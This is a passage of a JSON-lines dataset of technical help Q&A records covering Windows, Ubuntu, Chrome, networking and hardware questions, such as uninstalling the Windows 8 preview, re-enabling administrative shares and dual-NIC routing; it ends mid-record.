{"title": "How do I uninstall Windows 8 Consumer Preview?", "description": "Say, for instance, I don't like this Windows 8 consumer preview and that I downloaded, agreed to terms and installed it on my machine. How do I get rid of it? \nI want to go back to what I had before with all my data intact. Is this possible? I installed it right over top my current installation rather than on another partition or perhaps a backup machine. \nWhat can I do?\n", "answer": "If you created a second partition and installed it to the second partition while leaving your original installation of Windows 7/XP/etc on the primary drive, then yes you CAN uninstall it while retaining your old boot sector.  The steps are easy:\n\nBoot into Windows 7\nAccess the MSCONFIG program by going to 'Start', 'Run', 'msconfig'\nGo to the 'Boot' tab and remove the Windows 8 boot option by highlighting it and clicking 'Delete'.\nHighlight your Windows 7 boot option and click 'Set As Default'\nClose out MSCONFIG but DO NOT RESTART.\nAccess your Disk Manager snap-in by going to:\n Start\n Control Panel\n Administrative Tools\n Computer Management\n Double-click 'Disk Management' in the left pane\nFind the VFD you created for the Windows 8 installation\nRight-click on it\nSelect 'Delete Volume' (BE SURE THIS IS THE WINDOWS 8 PARTITION AND NOT ORIG OS!!!!)\nRight-click on the now empty volume and select 'Shrink Volume' (This will merge it back to your Primary)\nEnsure your C: Drive is marked with \"Boot, Page File, Crash Dump, Primary Partition\"\nClose the Module\nReboot the System \n\nIf you DIDN'T install Windows 8 to a new partition and Dual-Boot your system, you will need to use the Backup Disks.  Your Recovery partition (F2, Alt+R, etc, etc) may not be available if you've deleted it during the install so always have a backup or full disk IMG on hand to recover.\n\nOriginal Answer\nNo, you can't simply uninstall this preview. Had you read the FAQs:\n\nCan I uninstall Windows 8 Consumer Preview?\nNo. To go back to your previous version of Windows, you'll need to\n  reinstall it from the recovery or installation media that came with\n  your PC. (Unless you installed it to a separate partition, in that event READ ABOVE!!!)\n\n\"Is there a workaround?\" you ask with a twinkle of hope in your voice. No, it appears there is not. If you have the recovery discs or an image of your system, you might be in luck. If you boot from Windows 7 you will notice that the windows 8 preview cannot be downgraded to Windows 7. (YES IT CAN) You would need to do a clean install.(NOT IN ALL INSTANCES) Maybe you search for a restore point, but you didn't make one..\n\"Oh but I hate it, I have a list of complaints, maybe I'm irrational as well. What can I do?\" You can read about something before you do it next time I've already linked the FAQs, but:\n\nAre there risks to installing Windows 8 Consumer Preview?\nYes. Windows 8 Consumer Preview is stable and has been thoroughly\n  tested, but it’s not the finished product. Your PC could crash and you\n  could lose important files. You should back up your data and you\n  shouldn't test Windows 8 Consumer Preview on your primary home or\n  business PC. You might also encounter problems like:\n - Software that doesn’t install or work correctly, including antivirus or \n   security programs.\n\n - Printers, video cards, or other hardware that doesn’t work.\n\n - Difficulty accessing corporate or home networks.\n\n - Files that might become corrupted.\n\nYou should carefully balance the risks and rewards of trying out the\n  Windows 8 Consumer Preview before you install it.\n\nYou did backup your data, didn't you? You should always have your data backed up. Then this wouldn't be a problem. Maybe you could try backing up your data from the Windows 8 preview and doing a clean install? Ultimately, there is no way to rollback the windows 8 consumer preview without doing a complete restore from a system image or recovery partition/discs\nRemember to read the documentation, back-up your data, understand the risks, create restore points, image your system and take every precautionary step you can before you install a new OS.\n", "question_score": "9", "answer_score": 28}
{"title": "How do I change priority of firefox address bar suggestions to tags?", "description": "I have a heavily tagged bookmark collection, and searching it by tags is much more relevant  than by url, title or history. \nIs there a way to make tags a priority, so when I type in address bar, I get matching tags first?\n", "answer": "http://kb.mozillazine.org/Location_Bar_search\nYou can restrict what kind of results are shown in the drop down list by using customizable characters.\nInclude the character anywhere in the address bar separated by spaces to have it restrict what results are displayed.\nThe characters are as follows:\nPreference names in about:config    default key     action\nbrowser.urlbar.match.title  #   Returns results that match the text in the title.\nbrowser.urlbar.match.url    @   Returns results that match the text in the URL.\nbrowser.urlbar.restrict.bookmark    *   Returns only results that are from the bookmarks.\nbrowser.urlbar.restrict.history     ^   Returns only results that are from the browser’s history.\nbrowser.urlbar.restrict.tag     +   Returns only results that have been tagged.\nbrowser.urlbar.restrict.typed   ~   Returns only results that have been typed.\nbrowser.urlbar.restrict.openpage    %   Returns only open tabs (visible tabs, not active tab), available in Firefox 4 (SeaMonkey 2.1) and later\n\nAlso see browser.urlbar.default.behavior to customize your normal Auto Complete (AwesomeBar) search behavior at the Location Bar. Normal is to search on text strings, but can be changed to require word boundaries.\nThis will let you search by tags, at least, instead of openly searching everything. Using * tag will search bookmarks by both name AND tag, although it doesn't seem to matter which order the results for that up in. + tag will list all results for a tag.\n", "question_score": "9", "answer_score": 14}
{"title": "What advantages does Ending Task have over Ending Process?", "description": "From what I know, everytime we want to stop an app (or a frozen app), we will go TaskManager, select the app, Go to Process and terminate the process. \"Ending Process\" is preferred over \"Ending Task\" (sometimes \"ending task\" doesn't work anyway).\nImage for End Task:\n\nImage for End Process:\n\nHowever, http://technet.microsoft.com/en-us/library/bb726964.aspx:\n\nAs you examine processes, note that although applications have a main process, a single application may start multiple processes.  Generally, these processes are dependent on the main application process and are stopped when you terminate the main application process or use End Task. Because of this, you'll usually want to terminate the main application process or the application itself rather than dependent processes.\n\nThey are saying it is preferred to \"End Task\" because the process is stopped when I stop the app. But I don't understand their logic at all, Why not simply stop the process instead? \nWhat advantages does Ending Task have over Ending Process?\n", "answer": "For programs having at least one window, End Task does the same as clicking the X \"Close\" button – it sends the WM_CLOSE message to that window, asking it nicely to close. (For console windows, the equivalent is CTRL_CLOSE_EVENT.) The program can prompt the user to save changes, or do various cleanup tasks. If the process complies, Task Manager waits a few seconds and proceeds with terminating the process if it is still running.\nIf the process is frozen or otherwise not handling window messages it receives, then, of course, neither End Task nor the Close button can work. In those cases, Windows will usually ask you to end the program forcefully, but only after giving the program sufficient time to respond.\nMeanwhile, the End Process button does not concern itself with tasks or windows – it calls the TerminateProcess() function and Windows destroys the process immediately, without notifying it or giving it any chance to clean up.\n(Resources such as memory are released automatically once the process is gone; however, there might remain various temporary files if the program created them, and of course there's the risk of data corruption if the process is terminated in the middle of saving data.)\nSee also:\n\nVisual Studio Magazine. Kill an App Gently\n\n", "question_score": "9", "answer_score": 13}
{"title": "uTorrent causes DNS to stop working occasionally", "description": "While using uTorrent, DNS periodically stops responding.\nThe problem appears to not be related to too much bandwidth usage (as seen from the router to the computer), but may be related to some form of flood-protection provided by the router (more incoming connections to router than Windows will accept).\nHow do I get the network to work properly (while still being able to use uTorrent, of course)?\n", "answer": "bittorent clients aggressively connect to peers ... and some routers interpret this as a syn-flood.\n\nOpen Connections\nWhen uTorrent is loaded and uploads/downloads are paused (not stopped) it maintains open connections with your peers. Meanwhile legions of internet peers will still attempt to connect to you to find out if you have the bits they want. \nEventually you will reach the open connection limit imposed by your OS (in Windows 7 this is 10 connections) and connections from new clients will start queuing at your router.\nQueued clients will check aggressively to see if a connection is free. This aggressive polling may be interpreted as a syn-flood attack by the router. \nSolutions\n\nlower your half-open connection limit in your bittorent software below the connection limit imposed by your OS \ndisable IP flood protection at your router/modem.\n\nBandwidth Saturation\nIn addition, with uTorrent (or any bulk traffic) connection running unrestricted, the upload (and possibly download) pipe reaches full usage, forcing some \"upkeep\" traffic to take a back seat, which ends up decreasing network usefulness.\nHere is an example:\n\nHigh speed download (torrent or otherwise) saturates downstream link.\nUser tries to browse to a site not recently visited.  Computer generates a request for DNS info for desired site.  \"Upload\" of request to DNS server succeeds (not challenged for upstream pipe access).\nDNS server responds (or tries to), but response gets hung up on trying to get to the user's machine because the download pipe is saturated with download content, and since something has to be dropped, and the download is aggressive about maintaining speed, the DNS response gets dropped (at some point before it gets to the local router).\n\nThe same thing can happen if upload is unrestricted.  With upload saturated, packets known as TCP-ACK (which are sent as \"Hey, I got packet xyz successfully\" type responses) get hung up, making downloads grind to a halt, causing web browsing to become very patchy.\nSolutions\n\nFigure out what the maximum capabilities of your connection are (up and down, individually), and set the maximum speed of your bulk transfer clients to not use more than about 80% of that speed.  This will leave \"headroom\" for things like DNS and TCP-ACK packets to bypass the bulk traffic and get dealt with quickly.\nUse a router that can handle traffic shaping such that certain traffic (DNS, IMCP Ping, TCP-ACK) can be prioritized ahead of other forms of traffic, and some forms of traffic (torrent in particular) can be de-prioritized.  This is my preferred method.  This can give the added benefit of allowing the full up and down pipe to be usable for torrent traffic when higher priority traffic does not challenge it.\nUse some combination of 1 and 2 to restrain \"misbehaving\" traffic.\n\nIf interested in more info about traffic shaping Linux/BSD distros, MonoWall and IPCop both have some good information.\n", "question_score": "9", "answer_score": 14}
{"title": "What happens with Windows 8 Storage Spaces if I reinstall Windows?", "description": "I'm considering using Windows 8 Storage Spaces to combine disks. What will happen if, for some reason, my OS disk is no longer available. How will a fresh installation of Windows 8 react to an existing storage space? Will it automatically recognise the storage space or does the storage space configuration rely on state stored on the OS disk?\nBonus points if you can tell me what will happen to my storage space when I upgrade to Windows 8 retail.\n", "answer": "From the FAQ on the blog post:\n\nCan I move a storage pool from one PC to another, once created? For\n  example, if I have a cage with 6 removable drives?\nYes. Just connect the physical disks comprising the pool to the new\n  PC.\nSay I have 3 external enclosures and I remove them one at a time. I\n  then plug them into another Windows 8 PC in reverse order.  Will the\n  new PC think I have a broken pool or will it eventually catch up? What\n  if I never plug in one of the enclosures?\nYou can plug enclosures back in in any order. When Storage Spaces\n  detects a sufficient number of disks for quorum, it activates the pool\n  and contained spaces. You can plug in more enclosures later. If the\n  data on any disks becomes out of sync, Storage Spaces will\n  automatically sync them. Even if you never plug in some enclosures, as\n  long as Storage Spaces detects the minimum number of disks needed, you\n  can continue working with your data. Both via PowerShell and via\n  Control Panel, Storage Spaces informs you that a few physical disks\n  are missing, thereby encouraging you to plug them back in.\n\nThe above suggests that the storage pool stores state information on the disks themselves given you can move them the pool to another PC.\n", "question_score": "9", "answer_score": 15}
{"title": "What are PCI and PCI Express slots used for?", "description": "I'm comparing different Micro-ATX motherboards for a home server build and I was wondering what I would use PCI and PCI Express slots for?\nAre these used for hard-drives, GPUs, RAID controllers, RAM et cetera? \nWhat kind of PCI slot should I aim for and how many are usually needed?\n", "answer": "PCI/PCI-Express (aka PCI-E) slots let you install expansion cards.\nExpansion cards give your computer additional capabilities.  Some very common expansion cards were sound cards, 56k modems, and Ethernet adapters.  You don't have to populate your PCI/PCI-E slots, but it is an option if you need to extend your hardware.\nSince the introduction of the PC in the early 1980's, more and more capability has been included on the motherboard.  Most motherboards today include sound capability and (sometimes multiple) Ethernet ports.\nThe card must match the slot, e.g. if you have PCI-E slots, you need to buy a PCI-E card.  Newer slots support faster hardware.  PCI-E is the newest and fastest.  PCI is still very common and included in motherboards.  Older slot types include EISA (black) and AGP (brown - for graphics cards only).\nNo one makes RAM for PCI/PCI-E slots, RAM has had its own dedicated slim slot type on motherboards for about 20 years now (in the ISA days you could buy memory boards that plugged into the ISA slots).  Hard drive \"cards\" were a short experiment in the early 80's and no longer are made.  Hard drive controller cards are common though - these are just cards that sport additional IDE or SATA ports and let you attach more drives - but you need separate power lines for the drives off your power supply and you're responsible for having a case that lets you put them somewhere.\nBoth PCI and PCI-E have \"mini\" versions for laptop use.\n", "question_score": "9", "answer_score": 11}
{"title": "Enable (or work around) Administrative shares in Windows 8", "description": "So in using Windows 8, I've discovered that the administrative shares are disabled. There seems to be no easy way to get them re-enabled.\nIs anyone aware of a work around, or solution?\nI did not have this issue with Windows 7 After disabling UAC. However in Windows 8 this still doesn't work.\nThis is all I could find, however I am not satisfied with the information provided.\nhttp://www.computerperformance.co.uk/win8/windows8-administrative-shares.htm\nhttp://www.tomsitpro.com/articles/windows_8-file_sharing-windows_administrative_shares,2-195.html\n", "answer": "Note: If the computer is part of a domain, this does not apply as the admin shares are automatically enabled upon joining.\nTo enable the admin shares for computers in a HomeGroup or Workgroup, you must first ensure that File and Printer Sharing is enabled:\n\nIn the Desktop, right-click the Network icon in the system tray and click Open Network and Sharing Center:\n\nClick Change advanced sharing settings in the left hand menu:\n\nUnder the current profile, find the File and printer sharing section, and click Turn on file and printer sharing:\n\nClick Save Changes and confirm the change if prompted.\n\nWarning - the next section involves changing the Registry. Be extremely careful as incorrect editing can result in a non-functioning system or other problems!\n\nPress Windows+R and type regedit followed by Enter. Click Yes to confirm starting it as an Administrator if prompted.\n\nOn the left hand side expand the tree along the following path:\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\n\nSelect the System folder and in the right hand pane, right click, click New then DWORD (32-bit) Value.\n\nSet the name to LocalAccountTokenFilterPolicy then press Enter. Double-click the new entry and set the value to 1.\n\nExit the registry editor and restart the computer.\n\n", "question_score": "9", "answer_score": 11}
{"title": "How are commercial DVD's burned?", "description": "I'm not talking about the DVD-R's here. When you buy retail software and DVD movies from the store for example, how is that DVD burned onto the original disc? What would I need if I want to burn those type of \"commericial\" discs? (Is there a special device similar to a DVD burner for example, for this?)\n", "answer": "… using a commercial replication process. This process involves creating a Glass Master. Discs are not burned in the sense of punching holes into a recordable surface. They are rather \"pre-recorded\", by pressing them.\nThis procedure only pays off for large quantities of CDs/DVDs produced. It also requires a very clean room (said to be 100 times cleaner than an operation room in a hospital), in order to minimize the negative effects of dust and other particles.\nThere is a relatively well written FAQ here:\n\nThe reason why it is called a glass master is because the information is copied onto a special chemical coating on a circular block of glass. The block of glass is actually much larger than a CD (they are typically 240mm in diameter and 6mm deep) to facilitate handling and to avoid the sensitive data area from being touched or damaged.\n\nThe glass master is treated with a laser to hold the data (\"Laser Beam Recording\"), then baked. It is then metalized using Nickel vapor. Finally, the master will be rotated in a tank of a Nickel salt solution. This will create a stronger Nickel layer on the master itself, thus make it more solid.\nFinally, as the master is a positive, it is called \"father\". The negative (\"mother\"), will be created from it using a similar process.\n\nThe mother glass master is created from the father using electroforming and the mothers are then used to punch holes in the membrane layer on replicated CDs or DVDs that will then allow light through to reflect off the silver aluminium layer above the membrane layer in the centre of a CD or DVD.\n\nThat all being said, you will not be able to do this at home, unless you want to buy stuff like this:\n\nImage from SOS\nRelated links:\n\nWizbit – What is a glass master?\nWikipedia – Compact Disc Manufacturing\nSound on Sound – Preparing Your CD For Manufacturing\n\n", "question_score": "87", "answer_score": 136}
{"title": "Does vertical position affect the lifespan or integrity of a hard drive?", "description": "I've noticed on many small PC cases that the hard drives are installed vertically. In midi cases, towers and others of a larger housing, they are in the horizontal position.\nWhat impact on a hard drive does a vertical position have? Does it affect the life? Is it more prone to errors?\n(Not of SSDs (solid-state drive), just plain hard drive with all its mechanical parts inside.)\n", "answer": "According to several manufacturers, mounting a 3/5\" hard drive horizontally, vertically, or sideways doesn't affect the hard drive life significantly.\n\nThese are statements taken from the hard drive literature at each manufacturer's website; it's four years old but things probably haven't changed much.\nHitachi:\n\nThe drive will operate in all axes (6\n  directions). Performance and error\n  rate will stay within specification\n  limits if the drive is operated in the\n  other orientations from which it was\n  formatted.\n\nWestern Digital:\n\nPhysical mounting of the drive:  WD\n  drives will function normally whether\n  they are mounted sideways or upside\n  down (any X, Y, Z orientation).\n\nMaxtor:\n\nThe hard drive can be mounted in any orientation.\n\nSamsung:\n\nAs long as it is securely attached to\n  the chassis, hard disk drives may be\n  mounted either horizontally or\n  vertically depending on how your\n  computer's case is constructed.\n\nWhen asked if the drive could be mounted at askew angles, their official positions were:\n\nManufacturer  Contact method           Response  \n-------       ---------------------    ---------------------\nWD            Tech support, email      90 degrees. \nHitachi       Hitachi documentation    90 degrees. \nSamsung       Tech support, phone      90 degrees. \nFujitsu       Tech support, chat       90 degrees +-5. \nSeagate       Tech support, email      90 degrees preferred,\n                                         but diagonal OK. \nMaxtor        Tech support, phone      90 degrees preferred, but in\n                                         real world, whatever.\n\nBy 90 degrees, they mean vertical, horizontal, or sideways.\n", "question_score": "84", "answer_score": 72}
{"title": "How do I pass command line arguments to Dock items?", "description": "I'm attempting to follow the instructions for pinning startup tabs in Chrome. On OS X how do I add command line arguments to items that persist in my dock?\n", "answer": "You have basically two options:\nOption 1: Use Automator to create an application that in effect launches Chrome with command line arguments.\nStart Automator and select to create an Application. Double-click Run Shell Script in the Library/Utilities folder and replace the text content — cat — with the following:\nopen -a \"Google Chrome.app\" --args -pinned-tab-count=4\n# keep the .app suffix or will break with Parallels\n\nSave anywhere you like.\nTo replace this application's icon, Get Info on your real Google Chrome, click on the icon on the top left, press Cmd-C, Get Info on your Chrome Automator app, click the icon, and press Cmd-V.\nSince it's a different application, the Dock will display two Chrome applications when it's running: Chrome, and your Chrome launcher.\n\nOption 2: Edit your application bundle to launch a script instead. This script will start the actual application, adding the command line argument.\nRight-click Google Chrome.app and select Show Package Contents. Go to Contents/ and open Info.plist in Property List Editor/Xcode (Apple's developer tools), or a third party plist editor.\nLook for the entry CFBundleExecutable or Executable File. Remember its value (e.g. firefox-bin for Firefox). Replace it with parameterized-app.sh.\nOpen Terminal and enter the following:\ntouch /Applications/Firefox.app/Contents/MacOS/parameterized-app.sh\nopen /Applications/Firefox.app/Contents/MacOS/parameterized-app.sh\n\nAn editor for the .sh file will open. Set the contents of the file to:\n#!/usr/bin/env bash\nexec /Applications/Firefox.app/Contents/MacOS/firefox-bin -ProfileManager\n\n(using the actual executable's name you removed from Info.plist, adding the desired command-line arguments)\nSave and close. In Terminal, enter the following:\nchmod +x /Applications/Firefox.app/Contents/MacOS/parameterized-app.sh\n\nNow, close Terminal and move your application (which must not be running right now) to a different folder and back again. This will update Launch Services, otherwise your changes will be ignored and irritate you immensely.\nNow, when you open your application, it will actually execute the .sh file, which will in turn launch the actual executable file, sending the command line args along.\nIt will look and behave like you expect it to, but you will need to repeat this whenever you update your application, as this will generally replace the application bundle and all the changes you made.\n", "question_score": "82", "answer_score": 112}
{"title": "What's the difference between one-dash and two-dashes for command prompt parameters?", "description": "I was wondering why is it that some programs requires their command prompt parameters to have two dashes in front whereas some (most) only require one dash in front?\nFor example most programs look like this: relaxer -dtd toc.xml toc_gr.xml toc_jp.xml\nWhereas some programs look like this: xmllint --valid toc.xml --noout\nWhat's the reason that some requires two dashes instead of one? Doesn't it make sense for everyone to stick to one standard (i.e. a single dash will do).\n", "answer": "There is no widespread standard. There's some consistency e.g. in GNU programs, but you need to check each program's documentation.\nQuoting Wikipedia, emphasis mine:\n\nIn Unix-like systems, the ASCII hyphen–minus is commonly used to specify options. The character is usually followed by one or more letters. An argument that is a single hyphen–minus by itself without any letters usually specifies that a program should handle data coming from the standard input or send data to the standard output. Two hyphen–minus characters ( -- ) are used on some programs to specify \"long options\" where more descriptive option names are used. This is a common feature of GNU software.\n\nUsually, hyphens indicate a predefined argument. I think it's used to differentiate them from e.g. file names or other labels you might use as arguments. That's not always the case, though (see below).\n\nYou'll often find the same argument available both as short and long option, as e.g. in ls.\nSome programs use a single hyphen for one-character options, and two hyphens for multi-character options, but not all (GNU find comes to mind). Some programs have optional hyphens or skip them altogether (tar or BSD ps come to mind).\nSometimes long options (--foo) require arguments, while short options (-f) don't (or at least imply a specific default argument).\nShort options (e.g. cut -d ' ') can have arguments , while long options (e.g. ls --all) don't necessarily have them.\nTo set a particular behavior of a program, you sometimes need to use a short option, for others you need to use a long option, and for some you have a choice.\nOn a related note, some programs can handle no whitespace between an option and its argument, while others can't.\nAs I wrote at the beginning, there just is no common behavior or standard. Often you can trace similar behavior to the same library used for argument parsing, but you probably don't want to read the sources to find this out.\nYou really cannot infer one program's argument syntax from another's.\n\nIf you also consider Windows, it gets even worse: While the Windows command line calls traditionally use /f (at least most of the time, single characters) for options, with : as the separator between options and their value (see e.g. here); cross-platform utilities are widespread (such as those you mention) and bring along the more common hyphen syntax for arguments, with all the inconsistencies mentioned above.\n", "question_score": "82", "answer_score": 39}
{"title": "Disable automatic termination of applications on shutdown", "description": "Is there any Windows XP alternative to Windows Vista's shutdown process which prompts the user whether to continue or cancel shutdown in case some programs contain an unsaved data?\n", "answer": "You can do this with some code by handing the SystemEvents.SessionEnding event. This will show a dialog box when you try to logoff or shutdown and ask if you want to cancel the logoff or shutdown.\nThe code can be compiled for free with either the Visual C# 2008 Express Edition or with the windows SDK.\nWith the sdk, use the following command:\ncsc.exe   /out:StopShutdown.exe /target:winexe StopShutdown.cs \n\nHere's the code:\nusing System;\nusing System.Windows.Forms;\nusing Microsoft.Win32;\n\nnamespace StopShutdown\n{\n    static class Program\n    {\n        [STAThread]\n        static void Main()\n        {\n           string desktopRegKey = @\"HKEY_CURRENT_USER\\Control Panel\\Desktop\";\n           Registry.SetValue(desktopRegKey, \"AutoEndTasks\", 0);\n           Registry.SetValue(desktopRegKey, \"WaitToKillAppTimeout\", 20000);\n           Registry.SetValue(desktopRegKey, \"HungAppTimeout\", 20000);\n\n            Form AppForm = new Form()\n                {\n                    ClientSize = new System.Drawing.Size(0, 0),\n                    ControlBox = false,\n                    FormBorderStyle = FormBorderStyle.None,\n                    Opacity = 0,\n                    ShowIcon = false,\n                    ShowInTaskbar = false,\n                    SizeGripStyle = SizeGripStyle.Hide,\n                };\n\n            SystemEvents.SessionEnding += (_e, e) =>\n            {\n                DialogResult dr = MessageBox.Show(\n                                    \"Cancel shutdown?\"\n                                    , \"Shutdown\",\n                                    MessageBoxButtons.YesNo,\n                                    MessageBoxIcon.Question,\n                                    MessageBoxDefaultButton.Button1);\n\n                e.Cancel = (dr == DialogResult.Yes);\n            };\n\n            Application.Run(AppForm);\n        }\n\n    }\n}\n\nEdit:\nDownloadable source and exe.\n", "question_score": "8", "answer_score": 10}
{"title": "How to disable the Windows built-in zip functionality", "description": "Is there anyway to disable the built-in zip functionality without using other zip programs?\n", "answer": "Alex's answer describes how to disable zip folder support in Windows XP. Here is how to disable it for Windows Vista and Windows 7 (source).\nWindows Vista\n\nOpen Registry Editor (go to Start Menu -> Run and type “regedit“).\nNavigate to HKEY_CLASSES_ROOT\\CLSID and delete the following keys:\n{E88DCCE0-B7B3-11d1-A9F0-00AA0060FA31} and\n{0CD7A5C0-9F37-11CE-AE65-08002B2E1262}.\nRestart Windows and enjoy a life free from zip folders!\n\nWindows 7\n\nThe process is similar to Vista in terms of deleting the same registry keys. However, due to additional protections built-in, you must first change ownership of the keys to your username, which must be an administrator account.\n\nOpen Registry Editor (go to Start Menu -> Run and type “regedit“).\nNavigate to HKEY_CLASSES_ROOT\\CLSID and perform steps 3-7 for each of the two keys:\n{E88DCCE0-B7B3-11d1-A9F0-00AA0060FA31} and\n{0CD7A5C0-9F37-11CE-AE65-08002B2E1262}.\nRight-click on the key and select “Permissions…”. Click “Advanced” and then the “Owner” tab.\nSelect your username from the list.\nCheck the box next to “Replace owner on subcontainers and objects”. Click “OK”.\nIn the “Security” tab, select your username and grant Full Control. (If your username is not there, click “Add…”, type your username, then click “Check Names” and “OK”.) Click “OK” to apply the permissions settings.\nDelete the registry key.\nRepeat the process for the second key.\nRestart Windows and enjoy a life free from zip folders!\n\n", "question_score": "8", "answer_score": 10}
{"title": "Can I connect to two networks simultaneously with two Ethernet cards?", "description": "I have a LAN in my building that uses the 10.10.19.* IP range. In addition, I have an ADSL connection at home that uses the 192.168.1.* IP range internally. I also have two Ethernet cards.\nIs there any way by which I can access the two networks at the same time? I need a rule that routes all 10.10.19.* traffic through eth0 and everything else through eth1. Is this possible?\nI need to do this on Ubuntu 9.10 as well as Windows 7.\n", "answer": "Absolutely possible.  You need to configure your routes properly to do this.  You want your default route to go through your eth1, so your routing table should look like this:\n$ /sbin/route\nKernel IP routing table\nDestination     Gateway         Genmask         Flags Metric Ref    Use Iface\n10.10.19.0      *               255.255.255.0   U     0      0        0 eth0\n192.168.1.0     *               255.255.255.0   U     0      0        0 eth1\ndefault         192.168.1.1     0.0.0.0         UG    0      0        0 eth1\n\nWindows will look somewhat similar (with formatting variations of course) using the route print command.\nYou can set up the routes dynamically with the route commands on either platform.  I'm not sure what configuration options you need to set one as default (and the other as not-default, obviously)... will edit with that info.\nEdit:  If you're working with the GNOME or KDE GUI network managers, look for a \"set this interface as default\" option in the configuration for your eth1 device.  \nIf you're configuring /etc/network/interfaces by hand, take a look at the examples in this HOWTO.  In particular, the up option allows you to run commands after an interface comes up.  In your case, you may need to use that to run a route-delete command on an extra default route, or to run a route-add if neither of your interfaces set themselves as a default route:\n# example /etc/network/interfaces\n# replace the IP addresses in the route-del and route-add commands below\n# with those appropriate to your network\n\nauto eth0\niface eth0 inet dhcp\n    up route del default gw 10.10.19.1\n    # runs a route-delete if dhcp adds a default gateway for this interface\n\nauto eth1\niface eth1 inet dhcp\n    up route add default gw 192.168.1.1\n    # runs a route-add if dhcp neglects to add a default gateway for this interface\n\n", "question_score": "8", "answer_score": 10}
{"title": "What are the minimum user permissions required to install a Windows service?", "description": "What are the minimum user permissions required to install a Windows service?\n", "answer": "Administrative privileges for security reasons. \nOnly processes with Administrative privileges are able to open handles to the SCM (Service Control Manager) that can be used by the CreateService and LockServiceDatabase functions (see the MSDN article for details). In the article, you'll see that, for permissions to create a service you need the access right SC_MANAGER_CREATE_SERVICE (0x0002), which is included in the generic access right, GENERIC_WRITE. If you look a little further down the page, you'll see that only Administrators have access to this through SC_MANAGER_ALL_ACCESS. The same goes for using InstallUtil.exe to install a .NET Windows service, as InstallUtil calls the native CreateService function.\nAn application installing a service would go through one of the two methods. It sounds like a very logical design which prevents security issues, as explained here:\n\nActually, this design in Windows makes\n  sense. It is the result of security\n  consideration. Windows Service\n  normally runs under a high privilege\n  account, if a normal account can\n  install an unknown service, it is easy\n  for the malicious user to elevate his\n  privilege. For example, he can use\n  installutil.exe to install a hack\n  service which runs under Local Service\n  account. Then, when the service runs\n  the entire machine will be controlled\n  by the hacker with normal user\n  account. This is really a security\n  hole. So Windows only allows\n  Administrators to install a service.\n\n", "question_score": "8", "answer_score": 14}
{"title": "How to develop a Google chrome theme?", "description": "I have some design ideas for Google Chrome. I want to convert it into a theme.\nI searched a lot, but did not find a satisfactory explanation on how to go about doing that.\nDo you know what needs to be done? Some link, perhaps?\n", "answer": "Download any available theme for Chrome, like this one for instance.\nRename it so it has a .zip extension. Open it with your favorite archiving tool.\nThe theme is described in a file called manifest.json. It gives links to images used in the theme. They're in the \"i\" directory in the Greyscale one. The images are in PNG format.\nHere is the format of the manifest.json file for Greyscale:\n{\n\"version\":\"1.0\",\n\"name\":\"Greyscale\",\n\"theme\":\n{\"images\":\n    {\n    \"theme_frame\":\"i/agxjaHJvbWV0aGVtZXNyDAsSBEZpbGUY6ZwBDA\",\n    \"theme_toolbar\":\"i/agxjaHJvbWV0aGVtZXNyDAsSBEZpbGUY6pwBDA\",\n    \"theme_button_background\":\"i/agxjaHJvbWV0aGVtZXNyDAsSBEZpbGUYtawBDA\"\n    },\n\"colors\":\n    {\n    \"frame\":[32,32,32],\n    \"toolbar\":[210,210,246],\n    \"tab_text\":[0,0,0],\n    \"tab_background_text\":[0,0,0],\n    \"bookmark_text\":[0,0,0],\n    \"ntp_background\":[235,235,235],\n    \"ntp_text\":[0,0,0],\n    \"ntp_link\":[0,0,120],\n    \"ntp_section\":[210,210,210,1],\n    \"ntp_section_text\":[0,0,0],\n    \"ntp_section_link\":[0,0,120]\n    },\n\"properties\":\n    {\n    \"ntp_background_alignment\":\"bottom\",\n    \"ntp_background_repeat\":\"no-repeat\"},\n    \"tints\":\n        {\n        \"buttons\":[0.6,0,0.5]\n        }\n    }\n}\n\nUse this as a template for your own themes.\nYou'll find more information here too.\n", "question_score": "8", "answer_score": 10}
{"title": "How do I change the default text editor in Ubuntu", "description": "How can I change the default text editor for console programs in Ubuntu.\nWhen I run mutt and send a message, it currently loads up Joe and I would prefet to load Vim.\nI know I can change $EDITOR for me only, but would prefe to do it system wide. \n", "answer": "You can change $EDITOR systemwide. Just drop a short script into /etc/profile.d/ which does this. The file only needs a single line:\nexport EDITOR=/usr/bin/myeditor\n\nEdit:\nThere are two ways (at least :-/) in which a program can find an editor to launch. The traditional Unix/Linux mechanism is to use $EDITOR. In addition to that, Debian (and therefore Ubuntu) has special aliases for various kinds of programs. These are provided by the \"alternatives\" system (a system of configurable symlinks). For editors this provides the aliases editor and sensible-editor. These can be updated using update-alternatives:\nsudo update-alternatives --config editor\n\n(same for sensible-editor). This will prompt you for the editor to use.\nHowever, in Debian programs are suppposed to read $EDITOR first:\n\nThus, every program that launches an\n  editor or pager must use the EDITOR or\n  PAGER environment variable to\n  determine the editor or pager the user\n  wishes to use. If these variables are\n  not set, the programs /usr/bin/editor\n  and /usr/bin/pager should be used,\n  respectively.\nThese two files are managed through the dpkg \"alternatives\" mechanism.\n\n[...]\n\nIf it is very hard to adapt a program\n  to make use of the EDITOR or PAGER\n  variables, that program may be\n  configured to use\n  /usr/bin/sensible-editor and\n  /usr/bin/sensible-pager as the editor\n  or pager program respectively.\n\n(Debian Policy Manual, http://www.debian.org/doc/debian-policy/ch-customized-programs.html#s11.4 )\nIn one sentence:  Setting $EDITOR globally should be enough.\n", "question_score": "8", "answer_score": 13}
{"title": "Hotel like Wifi manager", "description": "Does anyone knows which are these systems that manages paid wifi networks and some hotels and airports?\nEven better, would anyone know a open/free project that would do or could be adapted to that end?\nThe idea is simple, I want to let the network open at physical level so anyone can connect. After connected however, the clients would have access only to a specified page where they can logging in, and doing the necessary validations the router would allow these of those ports (or even everything) for his IP.\n", "answer": "Depending on the wireless router that you use, you can flash the device to DD-WRT and use it as a hotspot.  There is an option already built in to use the AnchorFree software and appears to work similar to what hotels provide: paid service wireless. For a tutorial and how to setup a router that's already flashed to DD-WRT with the AnchorFree service look here: This utilizes two separate routers, one for home setup and the second for the \"hosted\" wifi.\n\nOne of the new features of the DD-WRT v24 firmware is a HotSpot Revenue generator called: AnchorFree. This posts an ad generated in a frame at the top of the browser window, through AnchorFree's network of advertisers. When someone clicks on the ad, the person hosting the router gets a little chunk of change from the click.\n\nFlashing the router depends on the router make and model.  Check out the DD-WRT website for more info on that.\nIf AnchorFree isn't exactly what you are looking for, built in the DD-WRT is also SputNik:\n\nSputnikNet is the super-flexible, web-based management and captive portal authentication system for Wi-Fi hotspots and hotzones. Manage one or thousands of 